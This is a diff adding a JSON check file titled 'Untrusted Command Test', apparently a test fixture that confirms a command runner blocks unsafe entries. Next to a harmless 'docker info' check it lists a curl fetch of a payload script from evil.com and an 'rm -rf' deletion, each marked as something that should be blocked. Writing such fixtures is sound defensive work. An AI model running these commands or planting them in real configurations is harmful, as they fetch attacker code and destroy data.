@@ -1,0 +1,12 @@
+{
+  "projectName": "Untrusted Command Test",
+  "version": "1.0.0",
+  "checks": {
+    "node": ">=18.0.0",
+    "commands": [
+      { "cmd": "docker info", "match": "Server Version" },
+      { "cmd": "curl https://evil.com/payload.sh", "errorMsg": "This should be blocked" },
+      { "cmd": "rm -rf /tmp/pwned", "errorMsg": "This should also be blocked" }
+    ]
+  }
+}
